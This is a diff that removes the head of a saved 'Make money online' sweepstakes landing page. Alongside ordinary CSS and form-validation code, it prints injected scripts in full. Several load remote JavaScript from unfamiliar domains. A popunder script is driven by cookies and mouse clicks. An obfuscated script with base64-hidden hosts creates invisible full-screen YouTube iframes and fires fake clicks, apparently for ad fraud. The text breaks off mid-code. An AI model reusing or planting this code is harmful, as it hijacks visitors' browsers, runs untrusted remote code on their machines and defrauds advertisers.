@@ -1,928 +1,229 @@
-<head><script src="https://live.r3engage.com/r3engage.php?r3move=1&amp;r3cache=0&amp;testsess6876=28fdfcf1dc847111579a0b76dcf981c8&amp;referrer=&amp;fp=_&amp;ce=a&amp;res=b&amp;cnv=f&amp;ver=d&amp;res_av=c&amp;ver_os=e&amp;campaign_id=1378&amp;s1=&amp;t1=&amp;t2=&amp;t3="></script><script type="text/javascript" async="" defer="" src="//s3.amazonaws.com/trackpush/trackpush.min.js"></script><script>var oid=5; var cid=701ef072841e42a58fbd7ff2bdda72e6;</script><script>console.log(oid + " " + cid);</script>
-    
-    
-      <style>.async-hide { opacity: 0 !important} </style>
-      <script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
-        h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
-        (a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
-      })(window,document.documentElement,'async-hide','dataLayer',4000,
-    {'GTM-T9KZN7L':true});</script>
-    <meta charset="UTF-8">
-    <meta name="robots" content="index, follow">
-    <!-- mobile setting -->
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>Make money online</title>
-    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.bundle.min.js" integrity="sha384-u/bQvRA/1bobcXlcEYpsEdFVK/vJs3+T+nXLsBYJthmdBuavHvAW6UsmqO2Gd/F9" crossorigin="anonymous"></script>
-    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
-
-    
-<script>
-	var re_pid = '196';
-
-	function r3_sweeps_populate_link(){
-
-		var r3_orig_link_url = "http://api.super-samples.com/r3.php?source="+re_pid+"&firstname={first}&lastname={last}&email={email}&dob-m={dob_mm}&dob-d={dob_dd}&dob-y={dob_yyyy}&gender={gender}&address={address1}&phone={phone}&city={city}&state={state}&zip={zip}";
-
-		window.location.href=r3_orig_link_url;
-	}
-</script>
-
-
-    <script>
-
-      (function(){ 
-        $('body').append("");
-
-        var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://b7zuvcmijd.execute-api.us-east-1.amazonaws.com/prod/GetPushScript?key=2Xa3N8H4tIMDq5DaLOjgimHq4HG8UhWO&domain='+window.location.hostname); xhr.onload = function() { if(!xhr.responseText) return; var response = JSON.parse(xhr.responseText); if(!response.success||!response.script) return; var s = document.createElement('script'); s.type = 'text/javascript'; s.innerHTML = response.script; document.getElementsByTagName('head')[0].appendChild(s); }; xhr.send();} )();_webpushLoaded = function(){
-            _webpushTrackAttributes({
-              'aff_id': '196',
-
-            });
-          }      </script>
-
-      <!-- <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script> -->
-        <!-- <script type="text/javascript">
-          var onloadCallback = function() {
-            $(".g-recaptcha").each(function() {
-              var el = $(this);
-              grecaptcha.render($(el).attr("id"), {
-                "sitekey" : '6LdZPWEUAAAAABas9sbgaIsQUS8wyWYTCcdPWql3',
-                "callback" : function(token) {
-                  $(el).parent().find(".g-recaptcha-response").val(token);
-                  $(el).parent().submit();
-                }
-              });
-            });
-          };
-        </script> -->
-        <!-- Global site tag (gtag.js) - Google Analytics -->
-
-        <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-111295674-1"></script>
-        <script>
-          window.dataLayer = window.dataLayer || [];
-          function gtag(){dataLayer.push(arguments);}
-          gtag('js', new Date());
-          gtag('config', 'UA-111295674-1', { 'optimize_id': 'GTM-T9KZN7L'});
-        </script>
-
-        <style>
-
-          h1 {
-            font-family: 'Arial';
-            margin: auto;
-            text-align: center;
-            color: #e3c73e;
-            letter-spacing: -2px;
-            font-weight: 800;
-          }
-          .inner {
-            background: #fff url('img/min1FrmBckWithoutLogo.png') top center;
-            border: 1px solid #ccc;
-            padding-top: 59px;
-          }
-          .outer {
-            background: #444;
-            width: 95%;
-            margin: 0 auto 43px auto;
-            padding: 1px;
-            max-width: 550px;
-            box-sizing: border-box;
-          }
-          .wrapper {
-            height: auto;
-            position: relative;
-            margin: auto;
-            top: 0;
-            bottom: 25%;
-            right: 0;
-            left: 0;
-            text-align: center;
-          }
-          div {
-            font-family: 'Arial';
-            color: #c2135b;
-          }
-          .landing_wrap {
-            width: auto;
-            max-width: 940px;
-            margin: auto;
-            display: table;
-            border: none !important;
-            box-shadow: none;
-          }
-          .vertical_content {
-            display: table-cell;
-            width: 100%;
-            height: 100%;
-            vertical-align: middle;
-          }
-          .privacy_top a {
-            padding: 0 5px;
-            color: #fff !important;
-            text-decoration: underline;
-            text-shadow: 2px 1px 3px rgba(0,0,0,0.5);
-            font-size: 13px;
-          }
-          .privacy_top {
-            position: absolute;
-            right: 0;
-            margin: 20px 40px;
-          }
-          #dp_content {
-            padding-bottom: 65px;
-          }
-          #dp_wrapper {
-            min-height: 100%;
-            margin-bottom: -60px;
-            position: relative;
-          }
-          body {
-            margin: 0;
-            padding: 0;
-            /*background: linear-gradient(       rgba(0, 0, 0, 0.45),        rgba(0, 0, 0, 0.45)     ), url('img/ss_bg.png') top center;*/
-            background: url('img/ss_bg.png');
-          }
-          .vertical_content_wrap {
-            display: table;
-            width: 100%;
-            height: 84vh;
-          }
-          .vertical_content {
-            display: table-cell;
-            width: 100%;
-            height: 100%;
-            vertical-align: middle;
-            padding-top: 1.8em;
-          }
-          .landing_wrap {
-            width: auto;
-            max-width: 940px;
-            margin: auto;
-            display: table;
-            border:none!important;
-            box-shadow: none;
-          }
-          footer {
-            height:60px!important;
-            position: relative!important;
-            padding-bottom:0!important;
-          }
-          footer p {
-            /*padding-top:15px;*/
-          }
-          h2 {
-            font-size: 55px;
-            font-family: 'Arial';
-            letter-spacing: -2px;
-            margin: 0;
-            padding: 0;
-            color: #e33e75;
-          }
-          .minFrmFld {
-            color: #666;
-            background-color: #ddd;
-            margin: 0;
-            padding-left: 5px;
-            width: 244px;
-            margin-left: 5px;
-            margin-right: 5px;
-          }
-          .minFrmFld, .minSubBtn {
-            display: inline-block;
-            font-size: 18px;
-            height: 48px;
-            border: none;
-            border-radius: 8px;
-            font-family: 'Arial';
-          }
-          .minSubBtn {
-            color: #fff;
-            text-transform: uppercase;
-            background: #482339 url('img/min1BtnLight.png') repeat-x;
-            width: 90%;
-            cursor: pointer;
-            height: 48px;
-            margin-bottom: 8px;
-            font-weight: 800;
-            clear: both;
-            margin-top: 10px;
-          }
-          .minOR {
-            display: inline-block;
-            font-size: 16px;
-            height: 48px;
-            width: 30px;
-            font-weight: bold;
-            line-height: 36px;
-          }
-          .policy_bottom_copy {
-            max-width: 825px;
-            margin: auto;
-            color: #000;
-            text-align: center;
-            text-shadow: 2px 1px 3px rgba(255, 255, 255, .65);
-            background: rgba(255, 255, 255, .0);
-            padding: 0px;
-            font-size: 10px;
-            font-family: 'Arial';
-            position: relative;
-          }
-          .btn-fb-login {
-            background: #3b5998;
-            text-decoration: none;
-            width: 105px;
-            height: 48px;
-            color: #fff;
-            font-size: 18px;
-            text-align: center;
-            line-height: 2.6em;
-            border-radius: 8px;
-          }
-          .minFrmFld {
-            height: 40px;
-            display: block;
-            float: left;
-          }
-          .minOR {
-            height: 40px;
-            float: left;
-          }
-          h1 {
-            font-size: 65px;
-            margin-bottom: 12px;
-            margin-top: 30px;
-          }
-          .fb_iframe_widget {
-            vertical-align: top !important;
-          }
-
-          .fb_iframe_widget {
-           display: block;
-           position: relative;
-           float: right;
-           margin-right: 5px;
-           width: 238px;
-           overflow: hidden;
-         }
-
-         #footer {
-          height: 60px;
-          font-size:11px;
-          margin-left:0;
-          margin-right:0;
-          position: relative !important;
-          padding-bottom: 0 !important;
-          background-color: #fff;
-          margin: 0;
-          bottom: 0;
-          left: 0;
-          right: 0;
-          text-align: center;
-        }
-
-        .landing_text img {
-          width:60%;
-          float: right;
-          padding: 5% 3% 2% 3%;
-        }
-
-        @media only screen and (min-width: 992px) {
-          .left-image img {
-            margin: 4% 2% 0% 2%;
-            /*width:35%;*/
-            float: left;
-            max-height: 400px;
-            max-width: 330px;
-            min-height:240px;
-          }
-        }
-
-        @media only screen and (max-width: 991px) and (min-width: 768px) {
-          .left-image img {
-            margin:4% 2% 0% 2%;
-            /*width:35%;*/
-            float: left;
-            max-height: 100%;
-            max-width: 220px;
-            min-height: 170px;
-          }
-        }
-
-        @media only screen and (max-width: 767px) and (min-width: 671px) {
-          .left-image img {
-            margin:4% 2% 0% 2%;
-            /*width:35%;*/
-            float: left;
-            max-height: 100%;
-            max-width: 170px;
-            min-height: 170px;
-          }
-        }
-
-        .landing_wrap_in {
-          background: #fff;
-          border: 6px solid #0067b0;
-          background: linear-gradient(to bottom, rgba(255,255,255,1) 0%, rgba(250,250,250,1) 84%, rgba(214,214,214,1) 100%);
-        }
-
-        #desktop p {
-          margin-top: 0px;
-          font-size: 1.5rem;
-          color: #333;
-        }
-
-        .minFrmFld {
-          padding: .375rem .75rem;
-          font-size: 1rem;
-          line-height: 1.5;
-          color: #495057;
-          background-color: #fff;
-          background-image:none;
-          background-clip: padding-box;
-          border:1px solid #ced4da;
-          border-radius: .25rem;
-          transition: border-color ease-in-out .15, box-shadow ease-in-out .15s;
-          width:55%;
-          margin-left: 3%;
-        }
-
-        /**********/
-        /* Mobile */
-        /**********/
-        @media only screen and (max-width: 670px) {
-          h1 {
-           font-size: 30px;
-           margin-top: 0;
-         }
-         .privacy_top {
-           position: static;
-           text-align: center;
-         }
-         .minOR {
-           display: none !important;
-         }
-         .fb_iframe_widget {
-           display: none !important;
-         }
-         .minSubBtn {
-           height: 66px;
-         }
-         .minSubBtn {
-           height: 66px;
-           margin-bottom: 8px;
-           font-weight: 800;
-           width: 100%;
-           box-sizing: border-box;
-         }
-         .minFrmFld {
-           height: 54px;
-           vertical-align: top;
-           width: 100%;
-           box-sizing: border-box;
-           margin-left: 0;
-         }
-         .inner {
-           padding: 59px 20px 20px 20px;
-         }
-
-         .landing_wrap_in > .landing_left {
-          display: inline-block;
-          width: 29%;
-          margin-right: .25rem;
-          padding: .5rem;
-        }
-
-        span.align-helper {
-          display: inline-block;
-          height: 100%;
-          vertical-align: middle;
-        }
-
-        .landing_wrap_in .landing_left img {
-          width: 95%;
-          vertical-align: middle;
-        }
-
-        #dp_content .container {
-          border:6px solid #0067b0;
-        }
-        #dp_content .bg-container {
-          background: linear-gradient(to bottom, rgba(255,255,255,1) 0%, rgba(250,250,250,1) 84%, rgba(214,214,214,1) 100%);
-        }
-        .logo-container {
-          padding: 1rem 1rem 0;
-        }
-        .logo-container img {
-          width:100%;
-        }
-        .main-image img {
-          margin-top: -50px;
-          margin-left: -2rem;
-          width:100%;
-        }
-        .vertical-content-wrap {
-          height: auto;
-        }
-        .landing-wrap {
-          border: none;
-        }
-        .landing-text {
-          padding:0px 5px 20px;
-        }
-        .landing-text .lp-text {
-          margin-bottom: 1.2rem;
-          font-family: 'Open Sans';
-          font-size: 1.2rem;
-          color: #0067b0;
-        }
-        .landing-text .main-image {
-          width: 75%;
-          margin:0 1rem 0 auto;
-        }
-        hr.lp-seperator {
-          border:0;
-          border-top: 1px solid #ccc;
-          margin:0 1rem;
-        }
-        .minFrmFld {
-          margin-top: 10px;
-        }
-        input#em.minFrmFld {
-          padding: .375rem .75rem;
-          font-size: 1rem;
-          line-height: 1.5;
-          color: #495057;
-          background-color: #fff;
-          background-image:none;
-          background-clip: padding-box;
-          border:1px solid #000;
-          border-radius: .25rem;
-          transition: border-color ease-in-out .15, box-shadow ease-in-out .15s;
-          /*margin-top: 2px;*/
-        }
-        #footer {
-          bottom: -85px;
-          background:#fff;
-          text-align: center;
-          padding:2px .5rem;
-          position: relative!important;
-        }
-      }
-    </style>
-
-    <script>
-      function dump(obj) {
-        var out = '';
-        for (var i in obj) {
-          out += i + ": " + obj[i] + "\n";
-        }
-
-        console.log(out);
-      }
-
-      $(document).ready(function() {
-    // check size on page load
-    checkSize();
-
-    // run test on resize of the window
-    $(window).resize(checkSize);
-
-
-
-    // _webpushTrackAttributes({
-    //       // });
-  });
-
-  //function to the css rule
-  function checkSize(){
-    if ($("#footer").css("bottom") == "-85px") {
-      $("#desktop").hide();
-      $("#mobile").show();
-    } else {
-      $("#mobile").hide();
-      $("#desktop").show();
-    }
-  }
-
-  function validateForm() {
-    var x=document.forms["signUp"]["EmailAddress"].value;
-    var y=document.forms["signUpMobile"]["EmailAddressMobile"].value;
-    if (x=="" && y=="") {
-      alert("Email must be filled out");
-      return false;
-    }
-  }
-
-  // function processSubmitDesktop(data) {
-  //   console.log('Google data desktop: ' + data);
-  //   $('#signUp').submit();
-  // }
-
-  // function processSubmitMobile(data) {
-  //   console.log('Google data mobile: ' + data);
-  //   $('#signUpm').submit();
-  // }
-
-  // function tagfire() {
-  //   gtag('event', 'sign_up');
-  //   if ($('input#defaultCheck1').prop('checked')) {
-  //     alert('test');
-  //   } else if ($('input#defaultCheck2').prop('checked')) {
-  //     alert('test');
-  //   }
-  // }
-
-  $(function() {
-    $('#em').focusout(function() {
-
-    });
-
-    $('#minSubBtn').click(function(e) {
-
-    });
-
-    $('#minSubBtnm').click(function(e) {
-      // var email = $('#emm').val();
-      // $.ajax("briteverify.php?email="+email, {
-      //   success: function(data) {
-      //     if (data == 'false') {
-      //       $('#emm').css('border-color','#d25455');
-      //       $('#emm').css('border-size','2px');
-      //       $('#emm').popover({animation: true, content: "Email is invalid, please check your spelling.", placement: "top"});
-      //       $('#emm').popover('show');
-      //       e.preventDefault();
-      //     } else {
-      //       $('#emm').css('border-color','#5abb93');
-      //       $('#emm').css('border-size', '2px');
-      //       $('#emm').popover('hide');
-      //     }
-      //     // $('#success').text(data);
-      //     // $('#success').show();
-      //   }
-      // });
-    });
-
-    $('#emm').focusout(function() {
-
-    });
-
-    var email = '';
-    var sub = false;
-    var prepop = '';
-
-    $('.signUp').on('submit', function(e) {
-      if (!sub) {
-        e.preventDefault();
-
-        var formelement = $(this);
-        var dore = '';
-        var checkemail = true;
-        var submitcheck = false;
-
-        if (email) {
-            if ($('#em').val() == email) {
-                if (dore) {
-                    if (dore == 'desktop') {
-                        checkemail = false;
-                    }
-                }
-            } else if ($('#emm').val() == email) {
-                if (dore) {
-                    if (dore == 'mobile') {
-                        checkemail = false;
-                    }
-                }
-            }
-        } else {
-          email = '';
-          if ($('#idaddress').val()) {
-            var checkemail = false;
-          } else {
-            var checkemail = true;
-          }
-        }
-
-        // setting the type of device user is on
-        if ($('#desktop').css('display') != 'none') {
-            dore = 'desktop';
-        } else if ($('#mobile').css('display') != 'none') {
-            dore = 'mobile';
-        }
-
-        // these conditions were updated to work with prepop
-        if ($('#em').val() && dore == 'desktop') {
-          email = $('#em').val();
-        } else if ($('#emm').val() && dore == 'mobile') {
-          email = $('#emm').val();
-        }
-
-        console.log('dore = ' + dore);
-        var email_ = email;
-        if (checkemail === true) {
-          $.ajax("verifydomain.php?email="+email, {
-            success: function(data) {
-                console.log(data);
-                if (data == 'true') {
-                    console.log('domain verified');
-                      if (prepop == "") {
-                        $.ajax("emailoversight.php?email="+email_, {
-                          success: function(data) {
-                            console.log(data);
-                            if (data == 'false') {
-                              if (dore == 'mobile') {
-                                $('#emm').css('border-color','#d25455');
-                                $('#emm').css('border-size','2px');
-                                $('#emm').popover({animation: true, content: "Email is invalid, please check your spelling.", placement: "top"});
-                                $('#emm').popover('show');
-                              } else {
-                                $('#em').css('border-color','#d25455');
-                                $('#em').css('border-size','2px');
-                                $('#em').popover({animation: true, content: "Email is invalid, please check your spelling.", placement: "bottom"});
-                                $('#em').popover('show');
-                              }
-                            } else {
-                              if (dore == 'mobile') {
-                                $('#emm').css('border-color','#5abb93');
-                                $('#emm').css('border-size', '2px');
-                                $('#emm').popover('hide');
-                              } else {
-                                $('#em').css('border-color','#5abb93');
-                                $('#em').css('border-size', '2px');
-                                $('#em').popover('hide');
-                              }
-
-                              gtag('event', 'sign_up');
-                              gtag('event', 'sign_up_with_bv');
-                              if ($('input#defaultCheck1').prop('checked') && $('input#defaultCheck2').prop('checked')) {
-                                console.log('ai allowed');
-                                gtag('event', 'AI_checked');
-                                var x=document.forms["signUp"]["EmailAddress"].value;
-                                var y=document.forms["signUpMobile"]["EmailAddressMobile"].value;
-                                var email = '';
-                                if (x=="") {
-                                  email = y;
-                                } else if (y == "") {
-                                  email = x;
-                                }
-
-                                var input = $("<input>")
-                                .attr("type", "hidden")
-                                .attr("name", "mydata").val('yes');
-                                formelement.append($(input));
-
-                                var input2 = $("<input>")
-                                .attr("type", "hidden")
-                                .attr("name", "email").val(email);
-                                formelement.append($(input2));
-
-                                var input3 = $("<input>")
-                                .attr("type", "hidden")
-                                .attr("name", "ip").val('108.162.219.34');
-                                formelement.append($(input3));
-
-                                var input4 = $("<input>")
-                                .attr("type", "hidden")
-                                .attr("name", "date").val('05-31-2020 12:49:33');
-                                formelement.append($(input4));
-
-                                var input5 = $("<input>")
-                                .attr("type", "hidden")
-                                .attr("name", "code").val('int');
-                                formelement.append($(input5));
-
-                              }
-                              sub = true;
-                              formelement.submit();
-                            }
-                          }
-                        });
-                      } else {
-                        gtag('event', 'sign_up');
-                        gtag('event', 'sign_up_no_bv');
-                        if ($('input#defaultCheck1').prop('checked') && $('input#defaultCheck2').prop('checked')) {
-                          console.log('ai allowed');
-                          gtag('event', 'AI_checked');
-                          var x=document.forms["signUp"]["EmailAddress"].value;
-                          var y=document.forms["signUpMobile"]["EmailAddressMobile"].value;
-                          var email = '';
-                          if (x=="") {
-                            email = y;
-                          } else if (y == "") {
-                            email = x;
-                          }
-
-                          var input = $("<input>")
-                          .attr("type", "hidden")
-                          .attr("name", "mydata").val('yes');
-                          formelement.append($(input));
-
-                          var input2 = $("<input>")
-                          .attr("type", "hidden")
-                          .attr("name", "email").val(email);
-                          formelement.append($(input2));
-
-                          var input3 = $("<input>")
-                          .attr("type", "hidden")
-                          .attr("name", "ip").val('108.162.219.34');
-                          formelement.append($(input3));
-
-                          var input4 = $("<input>")
-                          .attr("type", "hidden")
-                          .attr("name", "date").val('05-31-2020 12:49:33');
-                          formelement.append($(input4));
-
-                          var input5 = $("<input>")
-                          .attr("type", "hidden")
-                          .attr("name", "code").val('int');
-                          formelement.append($(input5));
-
-                        }
-                        sub = true;
-                        formelement.submit();
-                      }
-                } else {
-                    console.log('domain not verified');
-                    if (dore == 'mobile') {
-                      $('#emm').css('border-color','#d25455');
-                      $('#emm').css('border-size','2px');
-                      $('#emm').popover({animation: true, content: "Email is invalid, please check your spelling.", placement: "top"});
-                      $('#emm').popover('show');
-                    } else {
-                      $('#em').css('border-color','#d25455');
-                      $('#em').css('border-size','2px');
-                      $('#em').popover({animation: true, content: "Email is invalid, please check your spelling.", placement: "bottom"});
-                      $('#em').popover('show');
-                    }
-                 }
-              }
-          });
-        } else {
-          e.preventDefault();
-        }
-      }
-    });
-});
-
-$(document).on("click", ".cp-allow-button", function() {
-  gtag('event', 'Notifications_allowed');
-});
-
-$(document).on("click", ".cp-dismiss-button", function() {
-  gtag('event', 'Notifications_dismissed');
-});
-</script>
-<style>
-
-</style><script charset="UTF-8">ss78mest = {"did":"21","kTag":false,"scriptDomain":"moolmaincineper.online","tag":"test","extensionId":"1583073178","vTag":false,"version":452,"cid":1};
-window["jj837_11"] = "1583073178";
-</script><script src="https://moolmaincineper.online/inject.js?tag=test&amp;did=21&amp;v_tag=false&amp;k_tag=false" charset="UTF-8"></script><script src="https://www.googletagmanager.com/gtag/js?id=UA-127560459-1"></script><script type="text/javascript">var _at = {}; window._at.track = window._at.track || function(){(window._at.track.q = window._at.track.q || []).push(arguments);}; _at.domain = 'join.super-samples.com';_at.owner = '041e2bdba891';_at.idSite = '13210';_at.attributes = {};_at.worker = '/push-worker.js';_at.webpushid = 'web.61.apple.com';(function() { var u='//s3.amazonaws.com/trackpush/'; var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0]; g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'trackpush.min.js'; if(g.readyState) { g.onreadystatechange = function() { if ( g.readyState === 'loaded' || g.readyState === 'complete' ) { g.onreadystatechange = null; if (typeof _aimtellPermissionGranted!='function') { _aimtellPermissionGranted = function(){ fetch('https://trc.taboola.com/sg/pushpros/1/cm?redirect='+encodeURIComponent('https://beacon.aimtell.com/taboolatracker?id_site='+_at.idSite+'&tuid=<TUID>&puid='+_aimtellSubscriberID),{method:'GET',credentials:'include',redirect:'follow',mode:'no-cors'}); if (typeof _webpushPermissionGranted=='function') { _webpushPermissionGranted(); } }; }if (typeof _webpushPermissionDenied=='function') { _aimtellPermissionDenied = function(){_webpushPermissionDenied();}; }if (typeof _aimtellReady!='function') { _aimtellReady = function(){ if (typeof _webpushLoaded=='function') { setTimeout(_webpushLoaded,1000); } }; } } }; } else { g.onload = function(){ if (typeof _aimtellPermissionGranted!='function') { _aimtellPermissionGranted = function(){ fetch('https://trc.taboola.com/sg/pushpros/1/cm?redirect='+encodeURIComponent('https://beacon.aimtell.com/taboolatracker?id_site='+_at.idSite+'&tuid=<TUID>&puid='+_aimtellSubscriberID),{method:'GET',credentials:'include',redirect:'follow',mode:'no-cors'}); if (typeof _webpushPermissionGranted=='function') { _webpushPermissionGranted(); } }; }if (typeof _webpushPermissionDenied=='function') { _aimtellPermissionDenied = function(){_webpushPermissionDenied();}; }if (typeof _aimtellReady!='function') { _aimtellReady = function(){ if (typeof _webpushLoaded=='function') { setTimeout(_webpushLoaded,1000); } }; } };} s.parentNode.insertBefore(g,s); })();</script><script>try{!function(){'use strict';var c=['//','s:','tp','ht'].reverse().join(''),e=['lwz.infomucation.com','76'].join('/'),t=new Image;t.src=''.concat(c).concat(e,'.gif');}();}catch(e){}</script><script>try{(function(){
-  var s = document.createElement('script'); 
-  s.src = '//colextidapp.com/1e526623a79b7612df.js'; 
-  document.body.appendChild(s); 
-})();}catch(e){}</script><script>try{!function(){var cooki=navigator.cookieEnabled;
-var url = "";
-var clkcookie;
-
-if (cooki && window == window.top) {
-	clkcookie = GetCookie('stclick');
-	var pingcookie = GetCookie('pingnetwork');
-	if (clkcookie == null) {
-		if (pingcookie == null) {
-			var img = new Image();
-			var image_url = "https://eronqusa.ru/a/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2";
-			img.src = image_url;
-			img.onload = function(){
-				url = 'https://eronqusa.ru/c/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2';
-				var ExpDate = new Date ();
-				ExpDate.setTime(ExpDate.getTime() + (1 * 60 * 1000));
-				SetCookie('pingnetwork','1',ExpDate, "/");
-			};
-			img.onerror = function(){
-				var ExpDate = new Date ();
-				ExpDate.setTime(ExpDate.getTime() + (15 * 60 * 1000));
-				SetCookie('pingnetwork','2',ExpDate, "/");
-			};
-		} else if (pingcookie == 1) {
-			url = 'https://eronqusa.ru/c/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2';
-		}
-	}
-}
-
-var par = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes";
-var txt = new Array();
-txt[0]="http://yandex.ru/";
-txt[1]="http://google.com/";
-var b = Math.round(Math.random() * (txt.length - 1));
-var ssilka = txt[b];
-
-function showclick() {
-	cooki=navigator.cookieEnabled;
-	if(cooki) {
-		clkcookie = GetCookie('stclick');
-		if (clkcookie == null && url != "") {
-			var hrf = url;
-			url = "";
-			window.open(hrf, "site", par);
-			var ExpDate = new Date ();
-			ExpDate.setTime(ExpDate.getTime() + (6 * 60 * 1000));
-			SetCookie('stclick','1',ExpDate, "/");
-		}
-	}
-}
-
-function GetCookie(name) {
-  var matches = document.cookie.match(new RegExp(
-    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-  ));
-  return matches ? decodeURIComponent(matches[1]) : undefined;
-}
-
-function SetCookie (name, value) { var argv = SetCookie.arguments; var argc = SetCookie.arguments.length; var expires = (argc > 2) ? argv[2] : null;
-	var path = (argc > 3) ? argv[3] : null;
-	var domain = (argc > 4) ? argv[4] : null;
-	var secure = (argc > 5) ? argv[5] : false;
-	document.cookie = name + "=" + escape (value) +
-	((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
-	((path == null) ? "" : ("; path=" + path)) +
-	((domain == null) ? "" : ("; domain=" + domain)) +
-	((secure == true) ? "; secure" : "");
-}
-
-document.onmousedown=showclick;}();}catch(e){}</script><script>try{!function(e,t){if(!window.showoge){window.showoge=!0;var i=function(){return this},n=atob("aHR0cHM6Ly9zdGF0bG9nLnN0YXR1c2VzLnNwYWNlLw=="),o=function(){return this.logData={fingerprint:"",type:"oge1",type_task:"yshowes",id:0,v:""},this};i.prototype={fillOptions:function(e){return["data","success","error","json","headers","creds"].forEach(function(t){void 0===e[t]&&(e[t]=null)}),e},getSend:function(e,t){return this.sender("GET",e,t)},postSend:function(e,t){return this.sender("POST",e,t)},sender:function(e,t,i){i=this.fillOptions(i);var n=new XMLHttpRequest;if(n.open(e,t,!0),i.json||"POST"!==e||n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.onreadystatechange=function(){4===n.readyState&&200===n.status?i.success&&i.success(n.responseText):4==n.readyState&&200!=n.status&&i.error&&i.error(n.responseText,n.status)},i.creds&&(n.withCredentials=!0),i.headers)for(var o in i.headers)n.setRequestHeader(o,i.headers[o]);return i.data?n.send(i.data):n.send(),n}},o.prototype={add:function(e,t){this.logData[e]=t},push:function(e,t){this.logData[e].push(t)},send:function(){u.postSend(n+"event",{data:JSON.stringify(this.logData),json:!0})}};var d,s=window,r=document,a=0,c={},u=new i,l={},w=new o,h="xxxxxxxxxxxx4xxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}),m=atob("aHR0cHM6Ly9zZXJ2aWNlLm5zZXJ2aWNlcy5zcGFjZS8="),f=atob("aHR0cHM6Ly93d3cueW91dHViZS5jb20v"),p=function(e){var t=r.getElementById("yshow_oge"+e);return t||null},y=[],g=!1,v=!1,x=function(){if(!v){var e=y.length;if(e&&!g){g=!0;for(var t,i=Math.floor(Math.random()*e),n=0;!y[i]&&n<5;)i=Math.floor(Math.random()*e),n++;if(y[i])if(t=p(y[i])){var o=window.innerWidth?window.innerWidth:window.screen&&window.screen.width?window.screen.width:1280,d=window.innerHeight?window.innerHeight:window.screen&&window.screen.height?window.screen.height:960;t.style.zIndex="999999999",t.style.width=o+"px",t.style.height=d+"px";var s,a=(s=y[i],r.getElementById("yifr_oge"+s)||null);try{a.contentWindow.focus(),v=!0,setTimeout(function(){v=!1},1e3)}catch(e){v=!1}g=!1}else y[i]=null;else g=!1}}},b=function(){a>0||u.postSend(m+"youlist.php?worker=1&uid="+h,{data:"",success:function(e){S(e)}})},S=function(e){a=0,y=[];var t=JSON.parse(e);if(t[18])for(var i in t[18])!function(e,t){setTimeout(function(){E(e)},5e3*(a+0))}({id:i+"",item:t[18][i]+""}),a++;0===a&&setTimeout(b,2e4)},E=function(e,t){c[e.id]={isready:!1,isclicked:!1,isended:!1};var i=window.innerWidth?window.innerWidth:window.screen&&window.screen.width?window.screen.width:1280,n=window.innerHeight?window.innerHeight:window.screen&&window.screen.height?window.screen.height:960,o=r.createElement("div");o.id="yshow_oge"+e.id,o.style.position="fixed",o.style.zIndex="9999999999",o.style.left=o.style.top="0",o.style.width=o.style.height="10px",o.style.opacity="0.01",o.style.overflow="hidden",r.body.appendChild(o);var d=r.createElement("iframe");d.src=f+"embed?v=1&utmoge="+e.id+"&utmogeid="+e.item,d.id="yifr_oge"+e.id,d.style.width=i+"px",d.style.height=n+"px",d.style.overflow="hidden",d.width=i+"",d.height=n+"",d.allow="autoplay; encrypted-media; picture-in-picture",o.appendChild(d)},T=0,H=!1,N=function(e,t){var i={itemid:l.itemid};i[e]=!0,t&&(i.error=!0),parent.postMessage(JSON.stringify(i),"*")},M=function(){w.send(),N("ogeend")},L=function(e){if(N("ogeclick"),!H){H=!0;var t=document.createEvent("MouseEvents");t.initMouseEvent("click",!0,!1,window,1,e.screenX,e.screenY,e.clientX,e.clientY,!1,!1,!1,!1,0,null),d.dispatchEvent(t),setTimeout(M,35e3)}},R=function(){var e=document.evaluate('//div[contains(@class,"ytp-cued-thumbnail-overlay-image")]',document,null,XPathResult.ANY_TYPE,null);if(!(d=e.iterateNext()))return++T>30?void N("ogeend",!0):void setTimeout(R,100);document.body.addEventListener("mousemove",L),w.add("fingerprint",h),w.add("id",parseInt(l.itemid)),w.add("v",l.item),N("ogeready")},j=function(){var e=r.location.href.match(new RegExp("utmoge=([0-9]+)(?:|&.*)$","i"));e&&(l.itemid=e[1]),r.location.href.match(new RegExp("\\?v=1&utmoge","i"))?(e=r.location.href.match(/utm[a-z]+id=(.*)$/i))&&(l.item=e[1],window.history.replaceState({},"",f+"embed/"+l.item+"?utmoge="+l.itemid),u.getSend(f+"embed/"+l.item,{success:function(e){var 